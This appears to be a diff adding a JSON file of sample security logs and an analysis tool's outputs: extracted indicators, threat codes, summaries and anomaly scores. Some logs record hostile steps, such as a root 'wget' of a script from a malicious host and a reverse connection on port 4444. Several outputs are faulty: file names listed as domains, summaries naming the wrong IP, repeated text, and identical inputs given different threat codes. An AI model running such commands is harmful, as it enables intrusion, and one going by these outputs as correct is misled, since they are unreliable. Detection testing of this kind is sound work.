@@ -1,0 +1,408 @@
+[
+    {
+        "input": "Multiple failed SSH login attempts detected from 10.0.0.44.\nUser 'root' successfully authenticated after 12 failures.\nFile downloaded from http://evil-malware.net/dropper.exe\nSHA256: 8dd4a1fbb3941af1b29d5e0c938cf017b29f7d93faca3cfa1cd99f4c34fab123\nExploit reference: CVE-2021-44228\nEmail used: hackeralpha@protonmail.com\n",
+        "threat_type": 2,
+        "iocs": {
+            "ips": [
+                "10.0.0.44"
+            ],
+            "urls": [
+                "http://evil-malware.net/dropper.exe"
+            ],
+            "domains": [
+                "protonmail.com",
+                "dropper.exe",
+                "evil-malware.net"
+            ],
+            "hashes": [
+                "8dd4a1fbb3941af1b29d5e0c938cf017b29f7d93faca3cfa1cd99f4c34fab123"
+            ],
+            "cves": [
+                "CVE-2021-44228"
+            ],
+            "emails": [
+                "hackeralpha@protonmail.com"
+            ]
+        },
+        "summary": "multiple failed SSH login attempts detected from 10.0.0.44. User 'root' successfully authenticated after 12 failures.",
+        "anomaly_score": 0.6590499271634789,
+        "timestamp": "2025-11-29T20:20:07.481921"
+    },
+    {
+        "input": "Multiple failed SSH login attempts detected from 10.0.0.44.\nUser 'root' successfully authenticated after 12 failures.\nFile downloaded from http://evil-malware.net/dropper.exe\nSHA256: 8dd4a1fbb3941af1b29d5e0c938cf017b29f7d93faca3cfa1cd99f4c34fab123\nExploit reference: CVE-2021-44228\nEmail used: hackeralpha@protonmail.com\n",
+        "threat_type": 3,
+        "iocs": {
+            "ips": [
+                "10.0.0.44"
+            ],
+            "urls": [
+                "http://evil-malware.net/dropper.exe"
+            ],
+            "domains": [
+                "dropper.exe",
+                "protonmail.com",
+                "evil-malware.net"
+            ],
+            "hashes": [
+                "8dd4a1fbb3941af1b29d5e0c938cf017b29f7d93faca3cfa1cd99f4c34fab123"
+            ],
+            "cves": [
+                "CVE-2021-44228"
+            ],
+            "emails": [
+                "hackeralpha@protonmail.com"
+            ]
+        },
+        "summary": "multiple failed SSH login attempts detected from 10.0.0.44. User 'root' successfully authenticated after 12 failures.",
+        "anomaly_score": 0.6590499271634789,
+        "timestamp": "2025-11-29T20:23:25.519699"
+    },
+    {
+        "input": "Multiple failed SSH login attempts detected from 10.0.0.44.\nUser 'root' successfully authenticated after 12 failures.\nFile downloaded from http://evil-malware.net/dropper.exe\nSHA256: 8dd4a1fbb3941af1b29d5e0c938cf017b29f7d93faca3cfa1cd99f4c34fab123\nExploit reference: CVE-2021-44228\nEmail used: hackeralpha@protonmail.com\n",
+        "threat_type": 3,
+        "iocs": {
+            "ips": [
+                "10.0.0.44"
+            ],
+            "urls": [
+                "http://evil-malware.net/dropper.exe"
+            ],
+            "domains": [
+                "dropper.exe",
+                "protonmail.com",
+                "evil-malware.net"
+            ],
+            "hashes": [
+                "8dd4a1fbb3941af1b29d5e0c938cf017b29f7d93faca3cfa1cd99f4c34fab123"
+            ],
+            "cves": [
+                "CVE-2021-44228"
+            ],
+            "emails": [
+                "hackeralpha@protonmail.com"
+            ]
+        },
+        "summary": "multiple failed SSH login attempts detected from 10.0.0.44. User 'root' successfully authenticated after 12 failures.",
+        "anomaly_score": 0.6590499271634789,
+        "timestamp": "2025-11-29T20:24:03.193232"
+    },
+    {
+        "input": "Multiple failed SSH login attempts detected from 10.0.0.44.\nUser 'root' authenticated.\nFile downloaded from http://malicious-site.com/mal.exe\nSHA256: 123abc...\nCVE: CVE-2021-44228\nEmail: attacker@evil.com\n",
+        "threat_type": 3,
+        "iocs": {
+            "ips": [
+                "10.0.0.44"
+            ],
+            "urls": [
+                "http://malicious-site.com/mal.exe"
+            ],
+            "domains": [
+                "malicious-site.com",
+                "mal.exe",
+                "evil.com"
+            ],
+            "hashes": [],
+            "cves": [
+                "CVE-2021-44228"
+            ],
+            "emails": [
+                "attacker@evil.com"
+            ]
+        },
+        "summary": "multiple failed SSH login attempts detected from 10.0.0.44. User 'root' authenticated.",
+        "anomaly_score": 0.659049927179665,
+        "timestamp": "2025-11-29T20:24:28.617817"
+    },
+    {
+        "input": "Multiple failed SSH login attempts detected from 192.168.1.77.\nUser \"admin\" authenticated successfully after 9 failed attempts.\nSuspicious file downloaded from http://malicious-hub.net/payload.exe\nSHA256: d8c1b79e82c2f991013f89ccf12d00428f96b3efa1e67cc5de4f7f922e3d55aa\nOutbound request to known malware domain: darkdrop.xyz\nExploit reference used: CVE-2023-23397\nSuspicious email found: breachreport@protonmail.com\nProcess initiated unknown binary: payload.exe\n",
+        "threat_type": 4,
+        "iocs": {
+            "ips": [
+                "192.168.1.77"
+            ],
+            "urls": [
+                "http://malicious-hub.net/payload.exe"
+            ],
+            "domains": [
+                "protonmail.com",
+                "darkdrop.xyz",
+                "payload.exe",
+                "malicious-hub.net"
+            ],
+            "hashes": [
+                "d8c1b79e82c2f991013f89ccf12d00428f96b3efa1e67cc5de4f7f922e3d55aa"
+            ],
+            "cves": [
+                "CVE-2023-23397"
+            ],
+            "emails": [
+                "breachreport@protonmail.com"
+            ]
+        },
+        "summary": "multiple failed SSH login attempts detected from 192.168.1.77. user \"admin\" authenticated successfully after 9 failed attempts.",
+        "anomaly_score": 0.6590499271438045,
+        "timestamp": "2025-11-29T21:44:38.736697"
+    },
+    {
+        "input": "Multiple failed SSH login attempts detected from 192.168.1.77.\nUser \"admin\" authenticated successfully after 9 failed attempts.\nSuspicious file downloaded from http://malicious-hub.net/payload.exe\nSHA256: d8c1b79e82c2f991013f89ccf12d00428f96b3efa1e67cc5de4f7f922e3d55aa\nOutbound request to known malware domain: darkdrop.xyz\nExploit reference used: CVE-2023-23397\nSuspicious email found: breachreport@protonmail.com\nProcess initiated unknown binary: payload.exe\n",
+        "threat_type": 4,
+        "iocs": {
+            "ips": [
+                "192.168.1.77"
+            ],
+            "urls": [
+                "http://malicious-hub.net/payload.exe"
+            ],
+            "domains": [
+                "protonmail.com",
+                "darkdrop.xyz",
+                "payload.exe",
+                "malicious-hub.net"
+            ],
+            "hashes": [
+                "d8c1b79e82c2f991013f89ccf12d00428f96b3efa1e67cc5de4f7f922e3d55aa"
+            ],
+            "cves": [
+                "CVE-2023-23397"
+            ],
+            "emails": [
+                "breachreport@protonmail.com"
+            ]
+        },
+        "summary": "multiple failed SSH login attempts detected from 192.168.1.77. user \"admin\" authenticated successfully after 9 failed attempts.",
+        "anomaly_score": 0.6590499271438045,
+        "timestamp": "2025-11-29T21:45:10.428365"
+    },
+    {
+        "input": "[2025-11-30 03:14:22] Failed SSH login attempt from 185.244.25.17 using username 'root'.\n[2025-11-30 03:14:29] Failed SSH login attempt from 185.244.25.17 using username 'admin'.\n[2025-11-30 03:14:33] Successful SSH login from 185.244.25.17 with username 'root'.\n\n[2025-11-30 03:15:10] Suspicious file downloaded: http://dark-malware.net/tools/dropper.exe\nSHA256 hash: e2b9a7142d29a33bb7c989c4acfd112b6df4ae999dc10c4e1aa82bf49dd123aa\n\nKnown exploit detected: CVE-2024-44219 (Remote Code Execution)\n\nEmail used for further communication: breachteam@protonmail.com\n",
+        "threat_type": 4,
+        "iocs": {
+            "ips": [
+                "185.244.25.17"
+            ],
+            "urls": [
+                "http://dark-malware.net/tools/dropper.exe"
+            ],
+            "domains": [
+                "dark-malware.net",
+                "protonmail.com",
+                "dropper.exe"
+            ],
+            "hashes": [
+                "e2b9a7142d29a33bb7c989c4acfd112b6df4ae999dc10c4e1aa82bf49dd123aa"
+            ],
+            "cves": [
+                "CVE-2024-44219"
+            ],
+            "emails": [
+                "breachteam@protonmail.com"
+            ]
+        },
+        "summary": "[2025-11-30 03:14:22] Failed SSH login attempt from 185.244.25.17 using username 'admin' successful SSH login from 185.244.25.17 with username 'root'",
+        "anomaly_score": 0.6590499271297114,
+        "timestamp": "2025-11-29T22:49:40.748951"
+    },
+    {
+        "input": "Jan 12 14:22:10 server sshd[28421]: Failed password for invalid user admin from 185.234.217.99 port 49721 ssh2\nJan 12 14:22:12 server sshd[28421]: Failed password for invalid user root from 185.234.217.99 port 49721 ssh2\nJan 12 14:22:15 server sshd[28421]: Failed password for invalid user test from 185.234.217.99 port 49721 ssh2\nJan 12 14:22:17 server sshd[28421]: Received disconnect from 185.234.217.99: 11: Bye Bye\n",
+        "threat_type": 0,
+        "iocs": {
+            "ips": [
+                {
+                    "value": "185.234.217.99",
+                    "abuseipdb": {
+                        "error": "Couldn't find a tree builder with the features you requested: lxml. Do you need to install a parser library?"
+                    },
+                    "otx": {
+                        "error": "Couldn't find a tree builder with the features you requested: lxml. Do you need to install a parser library?"
+                    },
+                    "greynoise": {
+                        "error": "Couldn't find a tree builder with the features you requested: lxml. Do you need to install a parser library?"
+                    }
+                }
+            ],
+            "urls": [],
+            "domains": [],
+            "hashes": [],
+            "emails": []
+        },
+        "summary": "185.234.217.99 port 49721 ssh2 Jan 12 14:22:12 server sshd[28421]: Failed password for invalid user root from 185.234.217.99 port 49721 ssh2 Jan 12 14:22:15 server sshd[28421]: Received disconnect from 185.234.217.99: 11: Bye Bye Bye Bye Bye Bye Bye Bye Bye Bye By",
+        "anomaly_score": 0.6590499271496649,
+        "timestamp": "2025-12-25T19:43:25.989084"
+    },
+    {
+        "input": "Inbound email flagged by security gateway:\nFrom: \"Microsoft Support\" <support@microsoft-security-alerts.com>\nTo: employee@company.com\nSubject: Urgent \u2013 Password Reset Required\nBody contained phishing URL: http://login-microsoft-verification.co/reset\nAttachment scanned: benign.pdf (no malware)\n",
+        "threat_type": 0,
+        "iocs": {
+            "ips": [],
+            "urls": [],
+            "domains": [
+                {
+                    "value": "microsoft-security-alerts.com",
+                    "threatminer": {
+                        "error": "lookup failed"
+                    }
+                },
+                {
+                    "value": "benign.pdf",
+                    "threatminer": {
+                        "error": "lookup failed"
+                    }
+                },
+                {
+                    "value": "login-microsoft-verification.co",
+                    "threatminer": {
+                        "error": "lookup failed"
+                    }
+                },
+                {
+                    "value": "company.com",
+                    "threatminer": {
+                        "error": "lookup failed"
+                    }
+                }
+            ],
+            "hashes": [],
+            "emails": [
+                {
+                    "value": "support@microsoft-security-alerts.com",
+                    "note": "email enrichment coming soon"
+                },
+                {
+                    "value": "employee@company.com",
+                    "note": "email enrichment coming soon"
+                }
+            ]
+        },
+        "summary": "inbound email flagged by security gateway: From: \"Microsoft Support\" to: employee@company.com Subject: Urgent \u2013 Password Reset Required Body contained phishing URL: http://login-microsoft-verification.co/reset Attachment scanned: benign.pdf.",
+        "anomaly_score": 0.6590499271672464,
+        "timestamp": "2025-12-25T19:44:45.427875"
+    },
+    {
+        "input": "Jan 12 14:22:10 server sshd[28421]: Failed password for invalid user admin from 185.234.217.99 port 49721 ssh2\nJan 12 14:22:12 server sshd[28421]: Failed password for invalid user root from 185.234.217.99 port 49721 ssh2\nJan 12 14:22:15 server sshd[28421]: Failed password for invalid user test from 185.234.217.99 port 49721 ssh2\n",
+        "threat_type": 3,
+        "iocs": {
+            "ips": [
+                "185.234.217.99"
+            ],
+            "urls": [],
+            "domains": [],
+            "hashes": [],
+            "emails": []
+        },
+        "summary": "server sshd[28421]: Failed password for invalid user admin from 185.234.217.99 port 49721 ssh2 Jan 12 14:22:12 server sshd[28421]: Failed password for invalid user root from 185.234.217.99 port 49721 ssh2 Jan 12 14:22:15 server sshd[28421]: Failed password for invalid user root from 185.234.217.99",
+        "anomaly_score": 0.659,
+        "timestamp": "2025-12-25T20:03:40.494036"
+    },
+    {
+        "input": "Jan 12 14:22:10 server sshd[28421]: Failed password for invalid user admin from 185.234.217.99 port 49721 ssh2\nJan 12 14:22:12 server sshd[28421]: Failed password for invalid user root from 185.234.217.99 port 49721 ssh2\nJan 12 14:22:15 server sshd[28421]: Failed password for invalid user test from 185.234.217.99 port 49721 ssh2\n",
+        "threat_type": 3,
+        "iocs": {
+            "ips": [
+                "185.234.217.99"
+            ],
+            "urls": [],
+            "domains": [],
+            "hashes": [],
+            "emails": []
+        },
+        "summary": "Detected 3 failed SSH login attempt(s) from 185.234.217.99; this activity is consistent with a possible SSH brute-force attack.",
+        "anomaly_score": 0.659,
+        "timestamp": "2025-12-25T20:09:39.005377"
+    },
+    {
+        "input": "Feb 04 08:11:23 webserver nginx[1221]: 192.168.1.55 - - \"GET /admin/login.php HTTP/1.1\" 404 512 \"-\" \"Mozilla/5.0\"\nFeb 04 08:11:24 webserver nginx[1221]: 45.134.212.99 - - \"POST /wp-login.php HTTP/1.1\" 403 2048 \"-\" \"Python-urllib/3.8\"\nFeb 04 08:11:26 webserver nginx[1221]: 45.134.212.99 - - \"POST /xmlrpc.php HTTP/1.1\" 403 1890 \"-\" \"Python-urllib/3.8\"\nFeb 04 08:11:31 sshd[4412]: Failed password for invalid user test from 203.0.113.42 port 44112 ssh2\nFeb 04 08:11:33 sshd[4412]: Failed password for root from 203.0.113.42 port 44112 ssh2\nFeb 04 08:11:35 sshd[4412]: Failed password for admin from 203.0.113.42 port 44112 ssh2\nFeb 04 08:11:36 systemd[1]: Started Session 92 of user ubuntu.\nFeb 04 08:11:39 kernel: Packet dropped: IP=203.0.113.42 Port=44112 Reason=Invalid state\nFeb 04 08:11:44 webserver nginx[1221]: 156.232.10.44 - - \"GET /wp-content/plugins/akismet/admin.php HTTP/1.1\" 200 1680 \"-\" \"WordPress/6.1; https://victimsite.com\"\nFeb 04 08:11:48 audit[2931]: USER_CMD pid=2931 uid=0 auid=1000 cmd=\"/usr/bin/wget http://malicious-update.ru/update.sh\"\nFeb 04 08:11:48 systemd[1]: Starting NetworkManager script dispatcher service...\nFeb 04 08:11:49 kernel: Executed suspicious script: /tmp/update.sh (sha256: 9482a9efb023cbe492af42a412aa993fd392fa8e0193217ffab7460f334ab9fa)\nFeb 04 08:11:49 audit[2931]: USER_END pid=2931 uid=0\n",
+        "threat_type": 2,
+        "iocs": {
+            "ips": [
+                "156.232.10.44",
+                "45.134.212.99",
+                "203.0.113.42",
+                "192.168.1.55"
+            ],
+            "urls": [],
+            "domains": [
+                "victimsite.com",
+                "wp-login.php",
+                "update.sh",
+                "admin.php",
+                "xmlrpc.php",
+                "login.php",
+                "malicious-update.ru"
+            ],
+            "hashes": [
+                "9482a9efb023cbe492af42a412aa993fd392fa8e0193217ffab7460f334ab9fa"
+            ],
+            "emails": []
+        },
+        "summary": "Detected 3 failed SSH login attempt(s) from 192.168.1.55; this activity is consistent with a possible SSH brute-force attack.",
+        "anomaly_score": 0.659,
+        "timestamp": "2025-12-25T20:14:51.205647"
+    },
+    {
+        "input": "Jan 22 03:17:10 server sshd[21121]: Failed password for invalid user backup from 77.91.92.14 port 48211 ssh2\nJan 22 03:17:12 server sshd[21121]: Failed password for invalid user admin from 77.91.92.14 port 48211 ssh2\nJan 22 03:17:14 server sshd[21121]: Connection closed by authenticating user backup 77.91.92.14 port 48211 [preauth]\n",
+        "threat_type": 3,
+        "iocs": {
+            "ips": [
+                "77.91.92.14"
+            ],
+            "urls": [],
+            "domains": [],
+            "hashes": [],
+            "emails": []
+        },
+        "summary": "Detected 2 failed SSH login attempt(s) from 77.91.92.14; this activity is consistent with a possible SSH brute-force attack.",
+        "anomaly_score": 0.659,
+        "timestamp": "2025-12-25T20:17:53.502427"
+    },
+    {
+        "input": "Feb 03 04:12:44 server kernel: unusual activity detected: process /tmp/.hidden/kr00n running with uid 0\nFeb 03 04:12:45 server sshd[7123]: Failed password for invalid user oracle from 103.88.12.77 port 39211 ssh2\nFeb 03 04:12:46 server systemd: Started suspicious service kr00n.service\nFeb 03 04:12:46 server cron[1299]: CRON[8292]: (root) CMD (/tmp/.hidden/kr00n --recon --silent)\nFeb 03 04:12:47 server kernel: outbound connection to 185.199.220.44 on port 4444 using nonstandard protocol\nFeb 03 04:12:47 server bash: base64 payload detected: IyEvYmluL2Jhc2gKZWNobyAiUnVuVGltZSBBdHRhY2si\nFeb 03 04:12:48 server sudo: unknown user invoked sudo attempt\nFeb 03 04:12:49 server auditd: anomaly: setrlimit triggered by /tmp/.hidden/kr00n\nFeb 03 04:12:51 server kernel: segmentation fault in process kr00n (pid 7123)\n",
+        "threat_type": 3,
+        "iocs": {
+            "ips": [
+                "103.88.12.77",
+                "185.199.220.44"
+            ],
+            "urls": [],
+            "domains": [],
+            "hashes": [],
+            "emails": []
+        },
+        "summary": "Detected 1 failed SSH login attempt(s) from 103.88.12.77; this activity is consistent with a possible SSH brute-force attack.",
+        "anomaly_score": 0.659,
+        "timestamp": "2025-12-25T21:10:48.972379"
+    },
+    {
+        "input": "Feb 03 04:12:44 server kernel: unusual activity detected: process /tmp/.hidden/kr00n running with uid 0\nFeb 03 04:12:45 server sshd[7123]: Failed password for invalid user oracle from 103.88.12.77 port 39211 ssh2\nFeb 03 04:12:46 server systemd: Started suspicious service kr00n.service\nFeb 03 04:12:46 server cron[1299]: CRON[8292]: (root) CMD (/tmp/.hidden/kr00n --recon --silent)\nFeb 03 04:12:47 server kernel: outbound connection to 185.199.220.44 on port 4444 using nonstandard protocol\nFeb 03 04:12:47 server bash: base64 payload detected: IyEvYmluL2Jhc2gKZWNobyAiUnVuVGltZSBBdHRhY2si\nFeb 03 04:12:48 server sudo: unknown user invoked sudo attempt\nFeb 03 04:12:49 server auditd: anomaly: setrlimit triggered by /tmp/.hidden/kr00n\nFeb 03 04:12:51 server kernel: segmentation fault in process kr00n (pid 7123)\n",
+        "threat_type": 3,
+        "iocs": {
+            "ips": [
+                "103.88.12.77",
+                "185.199.220.44"
+            ],
+            "urls": [],
+            "domains": [],
+            "hashes": [],
+            "emails": []
+        },
+        "summary": "Detected 1 failed SSH login attempt(s) from 103.88.12.77; this activity is consistent with a possible SSH brute-force attack.",
+        "anomaly_score": 0.659,
+        "timestamp": "2025-12-25T21:12:50.603639"
+    },
+    {
+        "input": "Feb 03 04:12:44 server kernel: unusual activity detected: process /tmp/.hidden/kr00n running with uid 0\nFeb 03 04:12:45 server sshd[7123]: Failed password for invalid user oracle from 103.88.12.77 port 39211 ssh2\nFeb 03 04:12:46 server systemd: Started suspicious service kr00n.service\nFeb 03 04:12:46 server cron[1299]: CRON[8292]: (root) CMD (/tmp/.hidden/kr00n --recon --silent)\nFeb 03 04:12:47 server kernel: outbound connection to 185.199.220.44 on port 4444 using nonstandard protocol\nFeb 03 04:12:47 server bash: base64 payload detected: IyEvYmluL2Jhc2gKZWNobyAiUnVuVGltZSBBdHRhY2si\nFeb 03 04:12:48 server sudo: unknown user invoked sudo attempt\nFeb 03 04:12:49 server auditd: anomaly: setrlimit triggered by /tmp/.hidden/kr00n\nFeb 03 04:12:51 server kernel: segmentation fault in process kr00n (pid 7123)\n",
+        "threat_type": 3,
+        "iocs": {
+            "ips": [
+                "103.88.12.77",
+                "185.199.220.44"
+            ],
+            "urls": [],
+            "domains": [],
+            "hashes": [],
+            "emails": []
+        },
+        "summary": "Detected 1 failed SSH login attempt(s) from 103.88.12.77; this activity is consistent with a possible SSH brute-force attack.",
+        "anomaly_score": 0.659,
+        "timestamp": "2025-12-25T21:15:41.288699"
+    }
+]
